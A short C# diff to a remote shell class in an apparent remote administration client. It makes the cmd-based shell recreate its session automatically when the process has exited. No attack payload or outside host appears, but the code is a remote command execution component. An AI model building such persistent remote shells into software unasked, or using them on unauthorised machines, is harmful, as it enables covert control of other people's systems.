@@ -11,6 +11,7 @@ namespace xClient.Core.RemoteShell
 
         private void CreateSession()
         {
+            _read = true;
             _prc = new Process
             {
                 StartInfo = new ProcessStartInfo("cmd")
@@ -61,9 +62,9 @@ namespace xClient.Core.RemoteShell
 
         public bool ExecuteCommand(string command)
         {
-            if (_prc.HasExited)
-                return false;
-
+            if (_prc == null || _prc.HasExited)
+                CreateSession();
+            
             _prc.StandardInput.WriteLine(command);
             _prc.StandardInput.Flush();
 
@@ -72,7 +73,6 @@ namespace xClient.Core.RemoteShell
 
         public Shell()
         {
-            _read = true;
             CreateSession();
         }
 
